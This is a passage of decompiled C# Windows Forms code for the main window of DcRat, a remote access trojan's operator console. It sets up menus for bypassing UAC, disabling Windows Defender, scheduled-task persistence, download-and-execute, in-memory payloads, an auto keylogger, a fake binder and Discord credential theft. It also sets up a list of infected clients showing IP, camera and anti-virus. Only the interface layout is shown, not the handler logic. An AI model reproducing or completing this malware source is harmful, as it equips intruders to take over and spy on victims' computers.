		((ToolStripDropDownItem)SystemToolStripMenuItem).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[3]
		{
			(ToolStripItem)ShutDownToolStripMenuItem,
			(ToolStripItem)RebootToolStripMenuItem,
			(ToolStripItem)LogoutToolStripMenuItem
		});
		((ToolStripItem)SystemToolStripMenuItem).set_Name("SystemToolStripMenuItem");
		((ToolStripItem)SystemToolStripMenuItem).set_Size(new Size(180, 22));
		((ToolStripItem)SystemToolStripMenuItem).set_Text("System");
		((ToolStripItem)ShutDownToolStripMenuItem).set_Name("ShutDownToolStripMenuItem");
		((ToolStripItem)ShutDownToolStripMenuItem).set_Size(new Size(132, 22));
		((ToolStripItem)ShutDownToolStripMenuItem).set_Text("Shut Down");
		((ToolStripItem)ShutDownToolStripMenuItem).add_Click((EventHandler)ShutDownToolStripMenuItem_Click);
		((ToolStripItem)RebootToolStripMenuItem).set_Name("RebootToolStripMenuItem");
		((ToolStripItem)RebootToolStripMenuItem).set_Size(new Size(132, 22));
		((ToolStripItem)RebootToolStripMenuItem).set_Text("Reboot");
		((ToolStripItem)RebootToolStripMenuItem).add_Click((EventHandler)RebootToolStripMenuItem_Click);
		((ToolStripItem)LogoutToolStripMenuItem).set_Name("LogoutToolStripMenuItem");
		((ToolStripItem)LogoutToolStripMenuItem).set_Size(new Size(132, 22));
		((ToolStripItem)LogoutToolStripMenuItem).set_Text("Logout");
		((ToolStripItem)LogoutToolStripMenuItem).add_Click((EventHandler)LogoutToolStripMenuItem_Click);
		((ToolStripDropDownItem)BypassUACAToolStripMenuItem).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[4]
		{
			(ToolStripItem)SilentCleanupToolStripMenuItem,
			(ToolStripItem)FodhelperToolStripMenuItem,
			(ToolStripItem)RunasToolStripMenuItem,
			(ToolStripItem)CompMgmtLauncherToolStripMenuItem
		});
		((ToolStripItem)BypassUACAToolStripMenuItem).set_Name("BypassUACAToolStripMenuItem");
		((ToolStripItem)BypassUACAToolStripMenuItem).set_Size(new Size(180, 22));
		((ToolStripItem)BypassUACAToolStripMenuItem).set_Text("Bypass UAC");
		((ToolStripItem)SilentCleanupToolStripMenuItem).set_Name("SilentCleanupToolStripMenuItem");
		((ToolStripItem)SilentCleanupToolStripMenuItem).set_Size(new Size(189, 22));
		((ToolStripItem)SilentCleanupToolStripMenuItem).set_Text("Silent Cleanup");
		((ToolStripItem)SilentCleanupToolStripMenuItem).add_Click((EventHandler)SilentCleanupToolStripMenuItem_Click);
		((ToolStripItem)FodhelperToolStripMenuItem).set_Name("FodhelperToolStripMenuItem");
		((ToolStripItem)FodhelperToolStripMenuItem).set_Size(new Size(189, 22));
		((ToolStripItem)FodhelperToolStripMenuItem).set_Text("Fodhelper");
		((ToolStripItem)FodhelperToolStripMenuItem).add_Click((EventHandler)FodhelperToolStripMenuItem_Click);
		((ToolStripItem)RunasToolStripMenuItem).set_Name("RunasToolStripMenuItem");
		((ToolStripItem)RunasToolStripMenuItem).set_Size(new Size(189, 22));
		((ToolStripItem)RunasToolStripMenuItem).set_Text("Runas");
		((ToolStripItem)RunasToolStripMenuItem).add_Click((EventHandler)RunasToolStripMenuItem_Click);
		((ToolStripItem)CompMgmtLauncherToolStripMenuItem).set_Name("CompMgmtLauncherToolStripMenuItem");
		((ToolStripItem)CompMgmtLauncherToolStripMenuItem).set_Size(new Size(189, 22));
		((ToolStripItem)CompMgmtLauncherToolStripMenuItem).set_Text("CompMgmtLauncher");
		((ToolStripItem)CompMgmtLauncherToolStripMenuItem).add_Click((EventHandler)CompMgmtLauncherToolStripMenuItem_Click);
		((ToolStripDropDownItem)InstallToolStripMenuItem).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[4]
		{
			(ToolStripItem)SchtaskInstallToolStripMenuItem,
			(ToolStripItem)SchtaskUninstallToolStripMenuItem,
			(ToolStripItem)normalInstallToolStripMenuItem,
			(ToolStripItem)normalUninstallToolStripMenuItem
		});
		((ToolStripItem)InstallToolStripMenuItem).set_Name("InstallToolStripMenuItem");
		((ToolStripItem)InstallToolStripMenuItem).set_Size(new Size(180, 22));
		((ToolStripItem)InstallToolStripMenuItem).set_Text("Install");
		((ToolStripItem)SchtaskInstallToolStripMenuItem).set_Name("SchtaskInstallToolStripMenuItem");
		((ToolStripItem)SchtaskInstallToolStripMenuItem).set_Size(new Size(180, 22));
		((ToolStripItem)SchtaskInstallToolStripMenuItem).set_Text("Schtask Install");
		((ToolStripItem)SchtaskInstallToolStripMenuItem).add_Click((EventHandler)SchtaskInstallToolStripMenuItem_Click);
		((ToolStripItem)SchtaskUninstallToolStripMenuItem).set_Name("SchtaskUninstallToolStripMenuItem");
		((ToolStripItem)SchtaskUninstallToolStripMenuItem).set_Size(new Size(180, 22));
		((ToolStripItem)SchtaskUninstallToolStripMenuItem).set_Text("Schtask Uninstall");
		((ToolStripItem)SchtaskUninstallToolStripMenuItem).add_Click((EventHandler)SchtaskUninstallToolStripMenuItem_Click);
		((ToolStripItem)normalInstallToolStripMenuItem).set_Name("normalInstallToolStripMenuItem");
		((ToolStripItem)normalInstallToolStripMenuItem).set_Size(new Size(180, 22));
		((ToolStripItem)normalInstallToolStripMenuItem).set_Text("Normal Install");
		((ToolStripItem)normalInstallToolStripMenuItem).add_Click((EventHandler)normalInstallToolStripMenuItem_Click);
		((ToolStripItem)normalUninstallToolStripMenuItem).set_Name("normalUninstallToolStripMenuItem");
		((ToolStripItem)normalUninstallToolStripMenuItem).set_Size(new Size(180, 22));
		((ToolStripItem)normalUninstallToolStripMenuItem).set_Text("Normal Uninstall");
		((ToolStripItem)normalUninstallToolStripMenuItem).add_Click((EventHandler)normalUninstallToolStripMenuItem_Click);
		((ToolStripItem)justForFunToolStripMenuItem).set_Name("justForFunToolStripMenuItem");
		((ToolStripItem)justForFunToolStripMenuItem).set_Size(new Size(180, 22));
		((ToolStripItem)justForFunToolStripMenuItem).set_Text("Just For Fun");
		((ToolStripItem)justForFunToolStripMenuItem).add_Click((EventHandler)justForFunToolStripMenuItem_Click);
		((ToolStripItem)InformationToolStripMenuItem).set_Name("InformationToolStripMenuItem");
		((ToolStripItem)InformationToolStripMenuItem).set_Size(new Size(180, 22));
		((ToolStripItem)InformationToolStripMenuItem).set_Text("Information");
		((ToolStripItem)InformationToolStripMenuItem).add_Click((EventHandler)InformationToolStripMenuItem_Click);
		((ToolStrip)statusStrip1).set_ImageScalingSize(new Size(24, 24));
		((ToolStrip)statusStrip1).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)toolStripStatusLabel1,
			(ToolStripItem)toolStripStatusLabel2
		});
		((Control)statusStrip1).set_Location(new Point(0, 436));
		((Control)statusStrip1).set_Name("statusStrip1");
		statusStrip1.set_Padding(new Padding(1, 0, 9, 0));
		((Control)statusStrip1).set_Size(new Size(867, 22));
		((Control)statusStrip1).set_TabIndex(1);
		((Control)statusStrip1).set_Text("statusStrip1");
		((ToolStripItem)toolStripStatusLabel1).set_Name("toolStripStatusLabel1");
		((ToolStripItem)toolStripStatusLabel1).set_Size(new Size(16, 17));
		((ToolStripItem)toolStripStatusLabel1).set_Text("...");
		((ToolStripItem)toolStripStatusLabel2).set_Name("toolStripStatusLabel2");
		((ToolStripItem)toolStripStatusLabel2).set_Size(new Size(130, 17));
		((ToolStripItem)toolStripStatusLabel2).set_Text("                    Notification");
		((ToolStripItem)toolStripStatusLabel2).add_Click((EventHandler)ToolStripStatusLabel2_Click);
		ping.set_Enabled(true);
		ping.set_Interval(30000);
		ping.add_Tick((EventHandler)ping_Tick);
		UpdateUI.set_Enabled(true);
		UpdateUI.set_Interval(500);
		UpdateUI.add_Tick((EventHandler)UpdateUI_Tick);
		((ToolStrip)contextMenuLogs).set_ImageScalingSize(new Size(24, 24));
		((ToolStrip)contextMenuLogs).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)cLEARToolStripMenuItem });
		((Control)contextMenuLogs).set_Name("contextMenuLogs");
		((ToolStripDropDownMenu)contextMenuLogs).set_ShowImageMargin(false);
		((Control)contextMenuLogs).set_Size(new Size(77, 26));
		((ToolStripItem)cLEARToolStripMenuItem).set_Name("cLEARToolStripMenuItem");
		((ToolStripItem)cLEARToolStripMenuItem).set_Size(new Size(76, 22));
		((ToolStripItem)cLEARToolStripMenuItem).set_Text("Clear");
		((ToolStripItem)cLEARToolStripMenuItem).add_Click((EventHandler)CLEARToolStripMenuItem_Click);
		((ToolStrip)contextMenuThumbnail).set_ImageScalingSize(new Size(24, 24));
		((ToolStrip)contextMenuThumbnail).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)sTARTToolStripMenuItem,
			(ToolStripItem)sTOPToolStripMenuItem
		});
		((Control)contextMenuThumbnail).set_Name("contextMenuStrip2");
		((Control)contextMenuThumbnail).set_Size(new Size(99, 48));
		((ToolStripItem)sTARTToolStripMenuItem).set_ForeColor(SystemColors.ControlText);
		((ToolStripItem)sTARTToolStripMenuItem).set_Name("sTARTToolStripMenuItem");
		((ToolStripItem)sTARTToolStripMenuItem).set_Size(new Size(98, 22));
		((ToolStripItem)sTARTToolStripMenuItem).set_Text("Start");
		((ToolStripItem)sTARTToolStripMenuItem).add_Click((EventHandler)STARTToolStripMenuItem_Click);
		((ToolStripItem)sTOPToolStripMenuItem).set_Name("sTOPToolStripMenuItem");
		((ToolStripItem)sTOPToolStripMenuItem).set_Size(new Size(98, 22));
		((ToolStripItem)sTOPToolStripMenuItem).set_Text("Stop");
		((ToolStripItem)sTOPToolStripMenuItem).add_Click((EventHandler)STOPToolStripMenuItem_Click);
		ThumbnailImageList.set_ColorDepth((ColorDepth)16);
		ThumbnailImageList.set_ImageSize(new Size(256, 256));
		ThumbnailImageList.set_TransparentColor(Color.Transparent);
		((ToolStrip)contextMenuTasks).set_ImageScalingSize(new Size(24, 24));
		((ToolStrip)contextMenuTasks).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[11]
		{
			(ToolStripItem)sendFileFromUrlToolStripMenuItem,
			(ToolStripItem)downloadAndExecuteToolStripMenuItem,
			(ToolStripItem)sENDFILETOMEMORYToolStripMenuItem1,
			(ToolStripItem)disableUACToolStripMenuItem1,
			(ToolStripItem)disableWDToolStripMenuItem1,
			(ToolStripItem)installSchtaskToolStripMenuItem,
			(ToolStripItem)uPDATEToolStripMenuItem1,
			(ToolStripItem)autoKeyloggerToolStripMenuItem,
			(ToolStripItem)fakeBinderToolStripMenuItem,
			(ToolStripItem)toolStripSeparator4,
			(ToolStripItem)dELETETASKToolStripMenuItem
		});
		((Control)contextMenuTasks).set_Name("contextMenuStrip4");
		((ToolStripDropDownMenu)contextMenuTasks).set_ShowImageMargin(false);
		((Control)contextMenuTasks).set_Size(new Size(157, 230));
		((ToolStripItem)sendFileFromUrlToolStripMenuItem).set_Name("sendFileFromUrlToolStripMenuItem");
		((ToolStripItem)sendFileFromUrlToolStripMenuItem).set_Size(new Size(156, 22));
		((ToolStripItem)sendFileFromUrlToolStripMenuItem).set_Text("Send file from url");
		((ToolStripItem)sendFileFromUrlToolStripMenuItem).add_Click((EventHandler)sendFileFromUrlToolStripMenuItem_Click);
		((ToolStripItem)downloadAndExecuteToolStripMenuItem).set_Name("downloadAndExecuteToolStripMenuItem");
		((ToolStripItem)downloadAndExecuteToolStripMenuItem).set_Size(new Size(156, 22));
		((ToolStripItem)downloadAndExecuteToolStripMenuItem).set_Text("Send file to disk");
		((ToolStripItem)downloadAndExecuteToolStripMenuItem).add_Click((EventHandler)DownloadAndExecuteToolStripMenuItem_Click);
		((ToolStripItem)sENDFILETOMEMORYToolStripMenuItem1).set_Name("sENDFILETOMEMORYToolStripMenuItem1");
		((ToolStripItem)sENDFILETOMEMORYToolStripMenuItem1).set_Size(new Size(156, 22));
		((ToolStripItem)sENDFILETOMEMORYToolStripMenuItem1).set_Text("Send file to memory");
		((ToolStripItem)sENDFILETOMEMORYToolStripMenuItem1).add_Click((EventHandler)SENDFILETOMEMORYToolStripMenuItem1_Click);
		((ToolStripItem)disableUACToolStripMenuItem1).set_Name("disableUACToolStripMenuItem1");
		((ToolStripItem)disableUACToolStripMenuItem1).set_Size(new Size(156, 22));
		((ToolStripItem)disableUACToolStripMenuItem1).set_Text("Disable UAC");
		((ToolStripItem)disableUACToolStripMenuItem1).add_Click((EventHandler)disableUACToolStripMenuItem1_Click);
		((ToolStripItem)disableWDToolStripMenuItem1).set_Name("disableWDToolStripMenuItem1");
		((ToolStripItem)disableWDToolStripMenuItem1).set_Size(new Size(156, 22));
		((ToolStripItem)disableWDToolStripMenuItem1).set_Text("Disable WD");
		((ToolStripItem)disableWDToolStripMenuItem1).add_Click((EventHandler)disableWDToolStripMenuItem1_Click);
		((ToolStripItem)installSchtaskToolStripMenuItem).set_Name("installSchtaskToolStripMenuItem");
		((ToolStripItem)installSchtaskToolStripMenuItem).set_Size(new Size(156, 22));
		((ToolStripItem)installSchtaskToolStripMenuItem).set_Text("Install Schtask");
		((ToolStripItem)installSchtaskToolStripMenuItem).add_Click((EventHandler)installSchtaskToolStripMenuItem_Click);
		((ToolStripItem)uPDATEToolStripMenuItem1).set_Name("uPDATEToolStripMenuItem1");
		((ToolStripItem)uPDATEToolStripMenuItem1).set_Size(new Size(156, 22));
		((ToolStripItem)uPDATEToolStripMenuItem1).set_Text("Update all clients");
		((ToolStripItem)uPDATEToolStripMenuItem1).add_Click((EventHandler)UPDATEToolStripMenuItem1_Click);
		((ToolStripItem)autoKeyloggerToolStripMenuItem).set_Name("autoKeyloggerToolStripMenuItem");
		((ToolStripItem)autoKeyloggerToolStripMenuItem).set_Size(new Size(156, 22));
		((ToolStripItem)autoKeyloggerToolStripMenuItem).set_Text("Auto Keylogger");
		((ToolStripItem)autoKeyloggerToolStripMenuItem).add_Click((EventHandler)autoKeyloggerToolStripMenuItem_Click);
		((ToolStripItem)fakeBinderToolStripMenuItem).set_Name("fakeBinderToolStripMenuItem");
		((ToolStripItem)fakeBinderToolStripMenuItem).set_Size(new Size(156, 22));
		((ToolStripItem)fakeBinderToolStripMenuItem).set_Text("Fake Binder");
		((ToolStripItem)fakeBinderToolStripMenuItem).add_Click((EventHandler)fakeBinderToolStripMenuItem_Click);
		((ToolStripItem)toolStripSeparator4).set_Name("toolStripSeparator4");
		((ToolStripItem)toolStripSeparator4).set_Size(new Size(153, 6));
		((ToolStripItem)dELETETASKToolStripMenuItem).set_Name("dELETETASKToolStripMenuItem");
		((ToolStripItem)dELETETASKToolStripMenuItem).set_Size(new Size(156, 22));
		((ToolStripItem)dELETETASKToolStripMenuItem).set_Text("Delete");
		((ToolStripItem)dELETETASKToolStripMenuItem).add_Click((EventHandler)DELETETASKToolStripMenuItem_Click);
		performanceCounter1.set_CategoryName("Processor");
		performanceCounter1.set_CounterName("% Processor Time");
		performanceCounter1.set_InstanceName("_Total");
		performanceCounter2.set_CategoryName("Memory");
		performanceCounter2.set_CounterName("% Committed Bytes In Use");
		notifyIcon1.set_Icon((Icon)componentResourceManager.GetObject("notifyIcon1.Icon"));
		notifyIcon1.set_Text("DcRat");
		notifyIcon1.set_Visible(true);
		TimerTask.set_Enabled(true);
		TimerTask.set_Interval(5000);
		TimerTask.add_Tick((EventHandler)TimerTask_Tick);
		((ToolStrip)menuStrip1).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)FileToolStripMenuItem,
			(ToolStripItem)HelpToolStripMenuItem
		});
		((Control)menuStrip1).set_Location(new Point(0, 0));
		((Control)menuStrip1).set_Name("menuStrip1");
		((Control)menuStrip1).set_Size(new Size(867, 24));
		((Control)menuStrip1).set_TabIndex(4);
		((Control)menuStrip1).set_Text("menuStrip1");
		((ToolStripDropDownItem)FileToolStripMenuItem).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[4]
		{
			(ToolStripItem)BuilderToolStripMenuItem,
			(ToolStripItem)BlockToolStripMenuItem,
			(ToolStripItem)SettingToolStripMenuItem,
			(ToolStripItem)ExitToolStripMenuItem
		});
		((ToolStripItem)FileToolStripMenuItem).set_Name("FileToolStripMenuItem");
		((ToolStripItem)FileToolStripMenuItem).set_Size(new Size(37, 20));
		((ToolStripItem)FileToolStripMenuItem).set_Text("File");
		((ToolStripItem)BuilderToolStripMenuItem).set_Name("BuilderToolStripMenuItem");
		((ToolStripItem)BuilderToolStripMenuItem).set_Size(new Size(111, 22));
		((ToolStripItem)BuilderToolStripMenuItem).set_Text("Builder");
		((ToolStripItem)BuilderToolStripMenuItem).add_Click((EventHandler)builderToolStripMenuItem1_Click);
		((ToolStripItem)BlockToolStripMenuItem).set_Name("BlockToolStripMenuItem");
		((ToolStripItem)BlockToolStripMenuItem).set_Size(new Size(111, 22));
		((ToolStripItem)BlockToolStripMenuItem).set_Text("Block");
		((ToolStripItem)BlockToolStripMenuItem).add_Click((EventHandler)BlockToolStripMenuItem_Click);
		((ToolStripItem)SettingToolStripMenuItem).set_Name("SettingToolStripMenuItem");
		((ToolStripItem)SettingToolStripMenuItem).set_Size(new Size(111, 22));
		((ToolStripItem)SettingToolStripMenuItem).set_Text("Setting");
		((ToolStripItem)SettingToolStripMenuItem).add_Click((EventHandler)SettingToolStripMenuItem_Click);
		((ToolStripItem)ExitToolStripMenuItem).set_Name("ExitToolStripMenuItem");
		((ToolStripItem)ExitToolStripMenuItem).set_Size(new Size(111, 22));
		((ToolStripItem)ExitToolStripMenuItem).set_Text("Exit");
		((ToolStripItem)ExitToolStripMenuItem).add_Click((EventHandler)ExitToolStripMenuItem_Click);
		((ToolStripDropDownItem)HelpToolStripMenuItem).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)DocumentToolStripMenuItem,
			(ToolStripItem)AboutToolStripMenuItem
		});
		((ToolStripItem)HelpToolStripMenuItem).set_Name("HelpToolStripMenuItem");
		((ToolStripItem)HelpToolStripMenuItem).set_Size(new Size(44, 20));
		((ToolStripItem)HelpToolStripMenuItem).set_Text("Help");
		((ToolStripItem)DocumentToolStripMenuItem).set_Name("DocumentToolStripMenuItem");
		((ToolStripItem)DocumentToolStripMenuItem).set_Size(new Size(130, 22));
		((ToolStripItem)DocumentToolStripMenuItem).set_Text("Document");
		((ToolStripItem)DocumentToolStripMenuItem).add_Click((EventHandler)DocumentToolStripMenuItem_Click);
		((ToolStripItem)AboutToolStripMenuItem).set_Name("AboutToolStripMenuItem");
		((ToolStripItem)AboutToolStripMenuItem).set_Size(new Size(130, 22));
		((ToolStripItem)AboutToolStripMenuItem).set_Text("About");
		((ToolStripItem)AboutToolStripMenuItem).add_Click((EventHandler)aboutToolStripMenuItem1_Click);
		splitContainer1.set_Dock((DockStyle)5);
		((Control)splitContainer1).set_Location(new Point(0, 24));
		((Control)splitContainer1).set_Name("splitContainer1");
		splitContainer1.set_Orientation((Orientation)0);
		((Control)splitContainer1.get_Panel1()).get_Controls().Add((Control)(object)tabControl1);
		((Control)splitContainer1.get_Panel2()).get_Controls().Add((Control)(object)listView2);
		((Control)splitContainer1).set_Size(new Size(867, 412));
		splitContainer1.set_SplitterDistance(242);
		((Control)splitContainer1).set_TabIndex(5);
		((Control)tabControl1).get_Controls().Add((Control)(object)tabPage1);
		((Control)tabControl1).get_Controls().Add((Control)(object)tabPage3);
		((Control)tabControl1).get_Controls().Add((Control)(object)tabPage4);
		((Control)tabControl1).set_Dock((DockStyle)5);
		((Control)tabControl1).set_Location(new Point(0, 0));
		((Control)tabControl1).set_Margin(new Padding(2));
		((Control)tabControl1).set_Name("tabControl1");
		tabControl1.set_SelectedIndex(0);
		((Control)tabControl1).set_Size(new Size(867, 242));
		tabControl1.set_SizeMode((TabSizeMode)2);
		((Control)tabControl1).set_TabIndex(3);
		((Control)tabPage1).get_Controls().Add((Control)(object)listView1);
		tabPage1.set_Location(new Point(4, 22));
		((Control)tabPage1).set_Margin(new Padding(2));
		((Control)tabPage1).set_Name("tabPage1");
		((Control)tabPage1).set_Padding(new Padding(2));
		((Control)tabPage1).set_Size(new Size(859, 216));
		tabPage1.set_TabIndex(0);
		((Control)tabPage1).set_Text("Clients");
		listView1.set_BorderStyle((BorderStyle)0);
		listView1.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[13]
		{
			lv_ip, lv_country, lv_group, lv_hwid, lv_user, lv_camera, lv_os, lv_version, lv_ins, lv_admin,
			lv_av, lv_ping, lv_act
		});
		((Control)listView1).set_ContextMenuStrip(contextMenuClient);
		((Control)listView1).set_Dock((DockStyle)5);
		listView1.set_FullRowSelect(true);
		listView1.set_GridLines(true);
		listView1.set_HideSelection(false);
		((Control)listView1).set_Location(new Point(2, 2));
		((Control)listView1).set_Margin(new Padding(2));
		((Control)listView1).set_Name("listView1");
		listView1.set_ShowGroups(false);
		listView1.set_ShowItemToolTips(true);
		((Control)listView1).set_Size(new Size(855, 212));
		((Control)listView1).set_TabIndex(0);
		listView1.set_UseCompatibleStateImageBehavior(false);
		listView1.set_View((View)1);
		listView1.add_ColumnClick(new ColumnClickEventHandler(ListView1_ColumnClick));
		((Control)listView1).add_KeyDown(new KeyEventHandler(listView1_KeyDown));
		((Control)listView1).add_MouseMove(new MouseEventHandler(listView1_MouseMove));
		lv_ip.set_Text("IP Port");
		lv_ip.set_Width(121);
		lv_country.set_Text("Country");
		lv_country.set_Width(124);
		lv_group.set_Text("Group");
		lv_hwid.set_Text("HWID");
		lv_hwid.set_Width(117);
		lv_user.set_Text("User");
		lv_user.set_Width(117);
		lv_camera.set_Text("Camera");
		lv_os.set_Text("OS version");
		lv_os.set_Width(179);
		lv_version.set_Text("Client version");
		lv_version.set_Width(126);
		lv_ins.set_Text("Installed time");
		lv_ins.set_Width(120);
		lv_admin.set_Text("Permission");
		lv_admin.set_Width(166);
		lv_av.set_Text("Anti-virus");
		lv_av.set_Width(136);
		lv_ping.set_Text("Ping");
		lv_act.set_Text("Activity Program");
		lv_act.set_Width(350);
		((Control)tabPage3).get_Controls().Add((Control)(object)listView3);
		tabPage3.set_Location(new Point(4, 22));
		((Control)tabPage3).set_Margin(new Padding(2));
		((Control)tabPage3).set_Name("tabPage3");
		((Control)tabPage3).set_Size(new Size(859, 213));
		tabPage3.set_TabIndex(2);
		((Control)tabPage3).set_Text("Screens");
		tabPage3.set_UseVisualStyleBackColor(true);
		((Control)listView3).set_ContextMenuStrip(contextMenuThumbnail);
		((Control)listView3).set_Dock((DockStyle)5);
		listView3.set_HideSelection(false);
		listView3.set_LargeImageList(ThumbnailImageList);
		((Control)listView3).set_Location(new Point(0, 0));
		((Control)listView3).set_Margin(new Padding(2));
		((Control)listView3).set_Name("listView3");
		listView3.set_ShowItemToolTips(true);
		((Control)listView3).set_Size(new Size(859, 213));
		listView3.set_SmallImageList(ThumbnailImageList);
		((Control)listView3).set_TabIndex(0);
		listView3.set_UseCompatibleStateImageBehavior(false);
		((Control)tabPage4).get_Controls().Add((Control)(object)listView4);
		tabPage4.set_Location(new Point(4, 22));
		((Control)tabPage4).set_Margin(new Padding(2));
		((Control)tabPage4).set_Name("tabPage4");
		((Control)tabPage4).set_Padding(new Padding(2));
		((Control)tabPage4).set_Size(new Size(859, 213));
		tabPage4.set_TabIndex(3);
		((Control)tabPage4).set_Text("Auto Task");
		tabPage4.set_UseVisualStyleBackColor(true);
		listView4.set_BorderStyle((BorderStyle)0);
		listView4.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[2] { columnHeader4, columnHeader5 });
		((Control)listView4).set_ContextMenuStrip(contextMenuTasks);
		((Control)listView4).set_Dock((DockStyle)5);
		listView4.set_FullRowSelect(true);
		listView4.set_HideSelection(false);
		((Control)listView4).set_Location(new Point(2, 2));
		((Control)listView4).set_Margin(new Padding(2));
		((Control)listView4).set_Name("listView4");
		((Control)listView4).set_Size(new Size(855, 209));
		((Control)listView4).set_TabIndex(0);
		listView4.set_UseCompatibleStateImageBehavior(false);
		listView4.set_View((View)1);
		columnHeader4.set_Text("Task");
		columnHeader4.set_Width(97);
		columnHeader5.set_Text("Run times");
		columnHeader5.set_Width(116);
		listView2.set_BorderStyle((BorderStyle)0);
		listView2.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[2] { columnHeader1, columnHeader2 });
		((Control)listView2).set_ContextMenuStrip(contextMenuLogs);
		((Control)listView2).set_Dock((DockStyle)5);
		listView2.set_FullRowSelect(true);
		listView2.set_GridLines(true);
		listView2.set_HideSelection(false);
		((Control)listView2).set_Location(new Point(0, 0));
		((Control)listView2).set_Margin(new Padding(2));
		((Control)listView2).set_Name("listView2");
		listView2.set_ShowGroups(false);
		listView2.set_ShowItemToolTips(true);
		((Control)listView2).set_Size(new Size(867, 166));
		((Control)listView2).set_TabIndex(2);
		listView2.set_UseCompatibleStateImageBehavior(false);
		listView2.set_View((View)1);
		columnHeader1.set_Text("Time");
		columnHeader1.set_Width(150);
		columnHeader2.set_Text("Logs");
		columnHeader2.set_Width(705);
		ConnectTimeout.set_Enabled(true);
		ConnectTimeout.set_Interval(5000);
		ConnectTimeout.add_Tick((EventHandler)ConnectTimeout_Tick);
		((ToolStripItem)DiscordRecoveryToolStripMenuItem).set_Name("DiscordRecoveryToolStripMenuItem");
		((ToolStripItem)DiscordRecoveryToolStripMenuItem).set_Size(new Size(180, 22));
		((ToolStripItem)DiscordRecoveryToolStripMenuItem).set_Text("Discord Recovery");
		((ToolStripItem)DiscordRecoveryToolStripMenuItem).add_Click((EventHandler)DiscordRecoveryToolStripMenuItem_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(867, 458));
		((Control)this).get_Controls().Add((Control)(object)splitContainer1);
		((Control)this).get_Controls().Add((Control)(object)statusStrip1);
		((Control)this).get_Controls().Add((Control)(object)menuStrip1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MainMenuStrip(menuStrip1);
		((Form)this).set_Margin(new Padding(2));
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("DcRat");
		((Form)this).add_Activated((EventHandler)Form1_Activated);
		((Form)this).add_Deactivate((EventHandler)Form1_Deactivate);
		((Form)this).add_FormClosed(new FormClosedEventHandler(Form1_FormClosed));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)contextMenuClient).ResumeLayout(false);
		((Control)statusStrip1).ResumeLayout(false);
		((Control)statusStrip1).PerformLayout();
		((Control)contextMenuLogs).ResumeLayout(false);
		((Control)contextMenuThumbnail).ResumeLayout(false);
		((Control)contextMenuTasks).ResumeLayout(false);
		((ISupportInitialize)performanceCounter1).EndInit();
		((ISupportInitialize)performanceCounter2).EndInit();
		((Control)menuStrip1).ResumeLayout(false);
		((Control)menuStrip1).PerformLayout();
		((Control)splitContainer1.get_Panel1()).ResumeLayout(false);
		((Control)splitContainer1.get_Panel2()).ResumeLayout(false);
		((ISupportInitialize)splitContainer1).EndInit();
		((Control)splitContainer1).ResumeLayout(false);
		((Control)tabControl1).ResumeLayout(false);
		((Control)tabPage1).ResumeLayout(false);
		((Control)tabPage3).ResumeLayout(false);
		((Control)tabPage4).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
